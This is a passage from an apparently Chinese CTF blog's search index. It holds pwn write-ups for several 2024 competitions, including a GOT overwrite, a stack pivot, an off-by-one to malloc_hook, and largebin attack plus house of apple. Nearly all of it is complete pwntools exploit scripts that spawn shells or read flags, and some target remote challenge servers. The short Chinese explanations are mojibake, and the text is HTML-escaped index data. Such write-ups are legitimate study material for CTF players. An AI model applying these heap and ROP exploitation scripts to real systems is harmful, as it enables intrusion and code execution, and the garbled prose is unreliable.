print(&amp;quot;hook = &amp;quot;,hex(hook))
# dbg()
r.recvuntil(b&#39;Enter the size of the block you wish to summon (1 to 1280 bytes): &#39;)
r.sendline(str(0x30).encode())

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;consumption&#34;&gt;consumption&lt;/h1&gt;
&lt;p&gt;ä¸€é“cJSONè§£æçš„å †é¢˜ï¼Œæ‹·æ‰“gptåå¯ä»¥æ•´å‡ºäº¤äº’æ•°æ®ç»“æ„&lt;img src=&#34;https://l1u66.github.io//post-images/1726043609017.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;è¿™é‡Œçš„a3æ˜¯ä¸såç§»0x500çš„v13å˜é‡ï¼Œsccanfå‡½æ•°å¯ä»¥æŠŠa1å†™å…¥åˆ°v13æŒ‡å‘çš„åœ°å€ä¸­å»ï¼Œç¨‹åºæ˜¯32ä½çš„ï¼Œæ­£å¥½ä»¥%dçš„å½¢å¼å¯ä»¥å†™å…¥ä¸€ä¸ªåœ°å€ï¼Œæ”»å‡»æ€è·¯æ˜¯åœ¨heap_listä¸­å†™å…¥printfçš„gotè¡¨ï¼Œä»è€Œæ³„éœ²å‡ºlibcï¼Œé€šè¿‡editå°†free_gotä¿®æ”¹æˆsystemï¼Œfreeä¸€ä¸ªå¸¦/bin/shçš„å †å—å³å¯å¾—åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;i386&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./pwn&#39;)
elf = ELF(&#39;./pwn&#39;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

one = [0xe6aee, 0xe6af1, 0xe6af4]

# {&amp;quot;choice&amp;quot;:&amp;quot;3&amp;quot;,&amp;quot;idx&amp;quot;:0,&amp;quot;size&amp;quot;:&amp;quot;0x60&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;aaaa&amp;quot;}



def dbg():
    gdb.attach(r)


def add(size, content):   # ä¸è¶…è¿‡0x400  ä¸‹æ ‡ä»0å¼€å§‹
    r.recvuntil(b&#39;5.exit\t\n&#39;)
    r.sendline(b&#39;{&amp;quot;choice&amp;quot;:&amp;quot;1&amp;quot;,&amp;quot;idx&amp;quot;:0,&amp;quot;size&amp;quot;:&amp;quot;&#39; + bytes(str(size),encoding=&amp;quot;utf-8&amp;quot;) + b&#39;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&#39; + content + b&#39;&amp;quot;}&#39;)

def delete(idx):
    r.recvuntil(b&#39;5.exit\t\n&#39;)
    r.sendline(&#39;{&amp;quot;choice&amp;quot;:&amp;quot;2&amp;quot;,&amp;quot;idx&amp;quot;:&#39; + str(idx) + &#39;,&amp;quot;size&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;quot;}&#39;)


def show(idx):
    r.recvuntil(b&#39;5.exit\t\n&#39;)
    r.sendline(&#39;{&amp;quot;choice&amp;quot;:&amp;quot;3&amp;quot;,&amp;quot;idx&amp;quot;:&#39; + str(idx) + &#39;,&amp;quot;size&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;quot;}&#39;)


def edit(idx, content=b&#39;deafbeef&#39;):
    r.sendlineafter(b&amp;quot;5.exit\t\n&amp;quot;,b&#39;{&amp;quot;choice&amp;quot;:&amp;quot;4&amp;quot;,&amp;quot;idx&amp;quot;:1,&amp;quot;size&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&#39; + content + b&#39;&amp;quot;}&#39;)


heaplist=0x08051B10
add(8,b&amp;quot;/bin/sh&amp;quot;)
add(elf.got[&amp;quot;printf&amp;quot;], b&amp;quot;A&amp;quot;*0x4cc + p32(heaplist + 4))
show(1)
r.recv(0x8)
libc.address = u32(r.recv(4)) - libc.sym[&amp;quot;printf&amp;quot;]
print(&amp;quot;libc.addressÂ =Â &amp;quot;,hex(libc.address))

system = libc.sym[&amp;quot;system&amp;quot;]

edit(1,b&amp;quot;A&amp;quot; * 4 + p32(system))

delete(0)

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ç¬¬å››å±Šâ€œé•¿åŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ› æš¨äº¬æ´¥å†€ç½‘ç»œå®‰å…¨æŠ€èƒ½ç«èµ›ï¼ˆåˆèµ›ï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/2024-nian-jing-jin-ji-da-xue-sheng-xin-xi-an-quan-wang-luo-gong-fang-da-sai-shou-jie/"" data-c="
          &lt;h1 id=&#34;leak&#34;&gt;leak&lt;/h1&gt;
&lt;p&gt;ç¨‹åºæŠŠflagæ–‡ä»¶æ‰“å¼€ï¼Œç„¶åä¸€å­—èŠ‚ä¸€å­—èŠ‚æ¯”å¯¹ï¼ŒåŒ¹é…ä¸€å­—èŠ‚ä¹‹åæ‰ä¼šè¯»ä¸‹ä¸€ä¸ªï¼Œè¯»å–çš„ä½ç½®å’Œè¾“å…¥çš„æ•°æ®æŒ¨ç€ï¼Œåé¢å¯ä»¥ç›´æ¥å¸¦å‡ºæ¥ï¼Œåé¢å°±æ˜¯ä¸€å­—èŠ‚ä¸€å­—èŠ‚å¾—æ³„éœ²ï¼Œ&lt;s&gt;åƒåœ¾ç¯å¢ƒï¼Œæ•´ä¸€å †åƒåœ¾æ•°æ®ä¸çŸ¥é“å¹²å•¥ï¼Œå¦ä¸€é˜Ÿæ­»æ´»æ‰“ä¸å‡ºæ¥&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

flag = b&amp;quot;flag{&amp;quot;

while(1):
    print(&amp;quot;flag : {}&amp;quot;.format(flag))
    p = remote(&amp;quot;119.23.41.54&amp;quot;,35432)
    # p = process(&amp;quot;./leak&amp;quot;)
    pay = flag.ljust(40,b&#39;c&#39;)
    p.sendlineafter(&amp;quot;What&#39;s your name?&amp;quot;,pay)
    # gdb.attach(p)
    p.sendlineafter(&amp;quot;Please give me your flag:&amp;quot;,pay)
    p.recvuntil(&amp;quot;Sorry &amp;quot;)
    p.recv(40)
    flag += p.recv(1)
    print(flag)
    # flag += chr(j)
    # print(&amp;quot;flag : &amp;quot;,flag)
    # log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
    p.close()
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;likeputs&#34;&gt;likeputs&lt;/h1&gt;
&lt;p&gt;æ ˆæº¢å‡ºç­¾åˆ°é¢˜&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = remote(&amp;quot;119.23.41.54&amp;quot;,34005)
system = 0x000000000400540
cmd = 0x000000000400797
rdi = 0x0000000000400753
ret = 0x0000000000400506
p.sendafter(&amp;quot;cat flag\n&amp;quot;,b&#39;a&#39;*32 + p64(0) + p64(rdi) + p64(cmd) + p64(ret) + p64(system))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;condition&#34;&gt;Condition&lt;/h1&gt;
&lt;p&gt;æ¡ä»¶ç«äº‰....freeç½®é›¶æ“ä½œåœ¨sleepåï¼Œå¯ä»¥è®¾æ³•æ„é€ uafï¼Œæœ¬åœ°æ³„éœ²å‡ºæ¥heapåŸºåœ°å€äº†ï¼Œè¿œç«¯æ³„éœ²ä¸å‡ºæ¥ï¼Œè¿˜ä¸ç»™è¿œç«¯liibcç‰ˆæœ¬ï¼Œæ— æ•Œäº†&lt;/p&gt;
">2024å¹´äº¬æ´¥å†€å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›ï¼ˆé¦–å±Šï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/yang-cheng-bei-2024/"" data-c="
          &lt;p&gt;æ¯”èµ›è¿™å¤©æ‚äº‹æœ‰ç‚¹å¤šï¼Œæ•´ä¸ªä¸‹åˆæ²¡æ‰“æˆï¼Œåªçœ‹äº†ä¸¤é“é¢˜ï¼Œå‡ºäº†ä¸€é“ï¼Œå¦ä¸€é“æœ¬åœ°é€šäº†ï¼Œè¿œç«¯ä¸€åˆ°æœ€åè¾“å…¥ä¼ªé€ çš„ioæ—¶æŒ‚æ‰ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºè¾“å…¥ç¼“å†²åŒºè¢«å¡«æ»¡å¯¼è‡´æå‰flushäº†ï¼Œä¸‹é¢ç»™å‡ºçš„æ˜¯èµ›åæ”¹å–„åçš„expï¼Œå¯æƒœæ²¡æœ‰ç¯å¢ƒæ£€éªŒå“©(æ‚²&lt;/p&gt;
&lt;h1 id=&#34;pstack&#34;&gt;pstack&lt;/h1&gt;
&lt;p&gt;pwnçš„ç­¾åˆ°é¢˜ï¼Œæº¢å‡º16å­—èŠ‚çš„æ ˆè¿ç§»&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;)

p = process(&#39;./pwn&#39;)
#p = remote(&amp;quot;139.155.126.78&amp;quot;,32231)
elf = ELF(&#39;./pwn&#39;)
libc = ELF(&#39;./libc.so.6&#39;)

bss = 0x000000000601010 + 0x800
leave_ret = 0x00000000004006da
vuln = 0x0000000004006C4
pop_rdi_ret = 0x0000000000400773
read_got = 0x000000000600FD8
puts_plt = 0x000000000400520
ret = 0x0000000000400506

gdb.attach(p)
payload = b&#39;a&#39; * 48 + p64(bss + 0x30) + p64(vuln)
p.sendafter(&amp;quot;overflow?\n&amp;quot;,payload)


payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln) + p64(0) + p64(0x601810) + p64(leave_ret)
p.send(payload)

read_addr = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))

libc_base = read_addr - libc.symbols[&#39;read&#39;]
system_addr = libc_base + libc.symbols[&#39;system&#39;]
bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;read = &amp;quot;,hex(libc.symbols[&#39;read&#39;]))
one = [0xebc81, 0xebc85, 0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]

payload = b&#39;a&#39; * 48 + p64(bss - 0x100 + 0x30) + p64(vuln)
p.send(payload)
payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(bin_addr) + p64(ret) + p64(system_addr) + p64(vuln) + p64(0) + p64(bss - 0x100) + p64(leave_ret)
p.send(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;travelgraphorwçš„house-of-apple&#34;&gt;TravelGraph(orwçš„house of apple)&lt;/h1&gt;
&lt;p&gt;æ¼æ´ç‚¹æ˜¯uafï¼Œå¢åˆ æ”¹æŸ¥éƒ½æœ‰ï¼Œä½†æ˜¯editåªèƒ½ç”¨ä¸€æ¬¡è¿˜å¾—ç»•è¿‡ä¸€ä¸ªæ£€æŸ¥ï¼Œæ­£å¥½ç”¨æ¥largebin attack&lt;br&gt;
addå¯ä»¥ç”³è¯·0x510,0x520,0x530çš„å †å—ï¼Œå‡ºæ¥çš„chunké•¿è¿™æ ·&lt;img src=&#34;https://l1u66.github.io//post-images/1725027045497.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ¯ä¸ªåŠŸèƒ½éƒ½æ˜¯é€šè¿‡èµ·å§‹åœ°å’Œç»ˆç‚¹çš„æ•°å­—æ¥æŸ¥æ‰¾çš„ï¼Œä½†æ˜¯freeåæ­¤åŒºåŸŸä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥æˆ‘åˆ©ç”¨uafçš„æ–¹æ³•æ˜¯unsortedbinçš„chunkåˆ†å‰²ï¼Œä»è€Œä¼ªé€ èµ·å§‹åœ°ï¼Œç»ˆç‚¹ï¼Œfarå’Œå·¥å…·ï¼Œå¹¶ä¸”æ³¨æ„ï¼Œeditçš„é•¿åº¦æ˜¯æ ¹æ®å·¥å…·çš„æ•°å­—è®¡ç®—çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¼ªé€ å·¥å…·çš„æ•°å­—å®ç°ä¸€æ¬¡å¾ˆå¤§çš„å †æº¢å‡ºï¼Œåé¢å°±æ˜¯largebin attack+house of appleäº†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./pwn&#39;)
#r = remote(&amp;quot;139.155.126.78&amp;quot;,37421)
e = ELF(&#39;./pwn&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22æ‰“æœ¬åœ°

city = [b&amp;quot;guangzhou&amp;quot;, b&amp;quot;nanning&amp;quot;, b&amp;quot;changsha&amp;quot;, b&amp;quot;nanchang&amp;quot;, b&amp;quot;fuzhou&amp;quot;]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;5. Calculate the distance.\n&#39;)
    r.sendline(str(choice).encode())


def add1(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b&#39;car/train/plane?\n&#39;)
    r.sendline(b&#39;car&#39;)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)

def add2(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b&#39;car/train/plane?\n&#39;)
    r.sendline(b&#39;train&#39;)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)

def add3(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b&#39;car/train/plane?\n&#39;)
    r.sendline(b&#39;plane&#39;)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)


def delete(start, stop):
    cmd(2)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])


def show(start, stop):
    cmd(3)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])


def edit(start, stop, dis, content):
    cmd(4)
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[start])
    r.recvuntil(b&#39;Please input the city name\n&#39;)
    r.sendline(city[stop])
    r.recvuntil(b&#39;Which one do you want to change?\n&#39;)
    r.sendline(b&#39;0&#39;)
    r.recvuntil(b&#39;How far?\n&#39;)
    r.sendline(str(dis).encode())
    r.recvuntil(b&#39;Note:\n&#39;)
    r.send(content)


def exit():
    cmd(5)
#   x/20gx  &amp;amp;routes
add1(1,1,1000,b&#39;flag\x00\x00\x00\x00&#39;)#1
add3(1,2,1000,b&#39;a&#39;)#2
add1(2,2,1000,b&#39;a&#39;)#3
delete(1,1)
add2(2,4,1000,b&#39;a&#39;)#4
add1(1,1,1000,b&#39;\x70&#39;)#5
show(1,1)
r.recvuntil(&amp;quot;Note:&amp;quot;)
heap_base = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x1470
print(&amp;quot;heap_base = &amp;quot;,hex(heap_base))
delete(1,1)
delete(1,2)
add1(1,3,1000,b&#39;a&#39;)#1
delete(1,3)
add3(1,4,1000,b&#39;b&#39;*0x510)#1
show(1,4)
r.recvuntil(&amp;quot;Note:&amp;quot;)
r.recv(0x510)
libc_base = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 2206944
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))

delete(1,4)
add3(2,3,1000,b&#39;a&#39;*0x508 + p64(0x541) + p32(0) + p32(3) + p32(0x800) + p32(1000))#1
cmd(5)
r.recvuntil(b&#39;Please input the city name\n&#39;)
r.sendline(b&#39;nanchang&#39;)
add1(4,4,1000,b&#39;k&#39;)#1
add3(1,1,1000,b&#39;flag\x00\x00\x00\x00&#39;)#1

IO_list_all=libc_base+libc.symbols[&#39;_IO_list_all&#39;]
magic_gadget=libc_base+0x000000000016a06a
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
leave_ret=libc_base+0x000000000004da83
add_rsp_ret = libc_base+0x0000000000125b80
lock=libc_base+0x21ba60
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx_r12=libc_base+0x000000000011f2e7
pop_rax_ret=libc_base+0x0000000000045eb0
ret = libc_base+0x0000000000029139
syscall=libc_base+0x0000000000029db4
read_addr=libc_base+libc.symbols[&#39;read&#39;]
write_addr=libc_base+libc.symbols[&#39;write&#39;]
puts_addr=libc_base+libc.symbols[&#39;puts&#39;]
open_addr=libc_base+libc.symbols[&#39;open&#39;]

fake_io_file_addr = heap_base + 6576
setcontext = libc_base + libc.sym[&#39;setcontext&#39;]
system = libc_base + libc.sym[&#39;system&#39;]
_IO_wfile_jumps = libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]
lock = libc_base+0x1ee7d0

orw_addr = fake_io_file_addr + 632
#open orw_addr+16
orw = b&#39;flag\x00\x00\x00\x00&#39;
orw += p64(add_rsp_ret) + p64(add_rsp_ret) + p64(orw_addr-8) + p64(0) + p64(leave_ret) + p64(0)
orw += p64(pop_rdx_r12) + p64(0) + p64(fake_io_file_addr - 0x10)#fake io addr
orw += p64(pop_rdi) + p64(orw_addr+16-24)
orw += p64(pop_rsi) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(open_addr)
#read
orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw_addr + 0x100)
orw += p64(pop_rdx_r12) + p64(0x50) + p64(0)
orw += p64(read_addr)
#puts
orw += p64(pop_rdi) + p64(orw_addr + 0x100)
orw += p64(puts_addr)

fake_io_file = p64(2206944+libc_base)*2 + p64(1) + p64(2) + p64(0)*3 + p64(orw_addr-8)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(fake_io_file_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(_IO_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(fake_io_file_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(magic_gadget)
fake_io_file += orw


add1(3,3,1000,b&#39;a&#39;)#1
add1(3,4,1000,b&#39;a&#39;)#1
delete(2,4)
add3(1,1,1000,b&#39;a&#39;)#1
delete(4,4)


cmd(4)
r.recvuntil(b&#39;Please input the city name\n&#39;)
r.sendline(city[0])
r.recvuntil(b&#39;Please input the city name\n&#39;)
r.sendline(city[3])
r.recvuntil(b&#39;Which one do you want to change?\n&#39;)
r.sendline(b&#39;0&#39;)
r.recvuntil(b&#39;How far?\n&#39;)
r.sendline(b&#39;0&#39;)
r.recvuntil(b&#39;Note:\n&#39;)
r.send(p64(0) + p64(0x521) + fake_io_file.ljust(0x510,b&#39;\x66&#39;) + p64(0x520) + p64(0x520) + b&#39;c&#39;*0x518 + p64(0x531) + p64(2208016 + libc_base)*2 + p64(9200 + heap_base) + p64(IO_list_all - 0x20))#
# r.send(p64(0) + p64(0x521) + b&#39;b&#39;*0x518 + p64(0x521) + b&#39;c&#39;*0x518 + p64(0x531) + p64(0)*3 + p64(IO_list_all - 0x20) + b&#39;c&#39;*0x500 + p64(0x530) + p64(0x540) + b&#39;d&#39;*0x530 + b&amp;quot;  sh;&amp;quot; )
add3(1,1,1000,b&#39;a&#39;)#1
print(&amp;quot;IO_list_all = &amp;quot;,hex(IO_list_all))
print(&amp;quot;magic_gadget = &amp;quot;,hex(magic_gadget))
print(&amp;quot;leave_ret = &amp;quot;,hex(leave_ret))

# gdb.attach(r)


r.recvuntil(b&#39;5. Calculate the distance.\n&#39;)
r.sendline(str(7).encode())
r.interactive()

# + p64(2208016 + libc_base)*2 + p64(6576 + heap_base) + p64(IO_list_all - 0x20)
&lt;/code&gt;&lt;/pre&gt;
">ç¾ŠåŸæ¯2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/"" data-c="
          &lt;p&gt;gdb-multiarchå®‰è£…&lt;br&gt;
&lt;code&gt;sudo apt-get install gdb-multiarch&lt;/code&gt;&lt;br&gt;
å¼€ç»ˆç«¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;qemu-mipsel -g 1234 ./subcall_stack
æˆ–
qemu-mipsel -g 1234 -L mipsel-linux-gnu ./subcall_stack			# -L æŒ‡å®šåŠ¨æ€åº“
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦èµ·ç»ˆç«¯&lt;br&gt;
è¿›å…¥gdb-multiarchè°ƒè¯•ï¼ˆpwndbgï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gdb-multiarch ./subcall_stack
pwndbg&amp;gt; set architecture mips
The target architecture is assumed to be mips
pwndbg&amp;gt; target remote localhost:1234
&lt;/code&gt;&lt;/pre&gt;
">mipså¼‚æ¶æ„è°ƒè¯•</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/tfcctf2024/"" data-c="
          &lt;p&gt;æ‰“çš„ç¬¬ä¸€åœºå›½å¤–çš„æ¯”èµ›ï¼Œä»æ˜“åˆ°éš¾&lt;/p&gt;
&lt;h1 id=&#34;guard-the-bypass&#34;&gt;GUARD-THE-BYPASS&lt;/h1&gt;
&lt;p&gt;è¯¥é¢˜é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œæ–°è¿›ç¨‹ä¸­æœ‰ä¸€ä¸ªå¯ä»¥è‡ªå®šä¹‰é•¿åº¦è¾“å…¥çš„æ ˆæº¢å‡ºï¼Œç¨‹åºè¿˜å¼€äº†canaryï¼Œç”±äºç¨‹åºåªæœ‰ä¸€ä¸ªreadï¼Œæ‰€ä»¥æ³„éœ²canaryä¸å¤ªå¯èƒ½ï¼Œæº¢å‡ºé•¿åº¦è‡ªå®šï¼Œæ‰€ä»¥å¯ä»¥æº¢å‡ºåˆ°fsæ®µæ”¹å†™canaryï¼Œå”¯ä¸€æ³¨æ„çš„ç‚¹æ˜¯è¦†å†™çš„canaryéœ€è¦æ˜¯ä¸ªå¯å†™çš„åœ°å€ï¼ˆè°ƒè¯•å‡ºæ¥çš„ï¼‰ï¼Œåé¢å°±æ˜¯æ­£å¸¸çš„æ ˆæº¢å‡º&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
#io = remote(&#39;challs.tfcctf.com&#39;,31940)
io = process(&amp;quot;./guard&amp;quot;)
elf = ELF(&amp;quot;./guard&amp;quot;)
libc = elf.libc
#io = remote(&amp;quot;&amp;quot;,)

io.sendlineafter(b&#39;chall.\n&#39;,b&#39;1&#39;)
io.sendlineafter(b&#39;len: &#39;,b&#39;10000&#39;)

puts_plt = 0x0000000004010D0
puts_got = 0x000000000404018
rdi_ret = 0x0000000000401256
ret = 0x000000000040101a
data = 0x404280
d = p64(data)*7 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(0x00000000040136F)
d += ((0x850 - len(d))//8) * p64(data)
io.sendline(d)

ogg = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
puts = u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
libc_base = puts - libc.sym[&#39;puts&#39;]
print(&amp;quot;libc_base&amp;quot;,hex(libc_base))

d = p64(data)*7 + p64(ret) + p64(libc_base + ogg[5])
io.sendline(d)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;vspmoff-by-one&#34;&gt;VSPM(off by one)&lt;/h1&gt;
&lt;p&gt;&lt;s&gt;çœ‹é¢˜ç›®è¿˜ä»¥ä¸ºæ˜¯VM&lt;/s&gt;ç»“æœæ˜¯ä¸ª2.30çš„å †ï¼Œå…·æœ‰add,delete,showåŠŸèƒ½ï¼Œæ¼æ´ç‚¹åœ¨addåŠŸèƒ½ï¼Œå¯ä»¥å¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚,å¯ä»¥åšåˆ°å †é‡å ï¼Œè¿™ç‰ˆæœ¬è¿˜æœ‰hookï¼Œå¥½æ‰“çš„ä¸€æ‰¹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./chall&amp;quot;)
#p = remote(&#39;challs.tfcctf.com&#39;,32662)
elf = ELF(&amp;quot;./chall&amp;quot;)

def add(size,content1=b&#39;\x00&#39;,content2=b&#39;\x00&#39;):
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;length: &amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;credentials: &amp;quot;)
	p.send(content1)
	p.recvuntil(&amp;quot;credentials: &amp;quot;)
	p.send(content2)
    
def dele(idx):
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;index: &amp;quot;)
	p.sendline(str(idx))
	
def show():
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)

def exit():
	p.recvuntil(&amp;quot;Input: &amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
#gdb.attach(p,$rebase&#39;0x178B&#39;)	
add(0x78)#0
add(0x78)#1
add(0x68)#2
add(0x78)#3
dele(0)
pay = b&#39;a&#39;*0x78 + p8(0xf1)
add(0x78,pay)
dele(1)
add(0x78)#0
show()
p.recv(0x91)
main = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
base = main - 3886016
print(hex(main))
add(0x68)#1
dele(0)
dele(2)
pay = b&#39;a&#39;*0x78 + p8(0xf1)
add(0x78,pay)
dele(1)
add(0x58,b&#39;a&#39;*0x58)

onegadget = [0xc4dbf,0xc4ddf,0xc4de6,0xe1fa1]
one_gadget = base + onegadget[3]
malloc_hook = main - 88 - 0x18
fake_fast = malloc_hook - 35
print(&amp;quot;one_gadget = &amp;quot;,hex(one_gadget))
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
print(&amp;quot;base = &amp;quot;,hex(base))
print(&amp;quot;fake_fast = &amp;quot;,hex(fake_fast))
add(0x48,b&#39;b&#39;*24 + p64(0x71) + p64(fake_fast))
add(0x68)
payload = b&#39;\x00&#39;*19 + p64(one_gadget)
add(0x68,payload)
p.recvuntil(&amp;quot;Input: &amp;quot;)
p.sendline(&amp;quot;1&amp;quot;)
#gdb.attach(p)	#----------------------------------------------------------------------------
p.recvuntil(&amp;quot;length: &amp;quot;)
p.sendline(str(0x18))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;mcguavahouse-of-water&#34;&gt;MCGUAVAï¼ˆhouse of waterï¼‰&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-282792.htm#msg_header_h3_4&#34;&gt;å­¦ä¹ é“¾æ¥&lt;/a&gt;&lt;br&gt;
é‡é‡çº§æ¥äº†ï¼ŒçœŸç‰›æ‰¹ä¸€é¢˜ï¼Œé‡ç‚¹åˆ†æ!!!&lt;br&gt;
å…ˆçœ‹åŠŸèƒ½&lt;br&gt;
add:&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723130644373.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
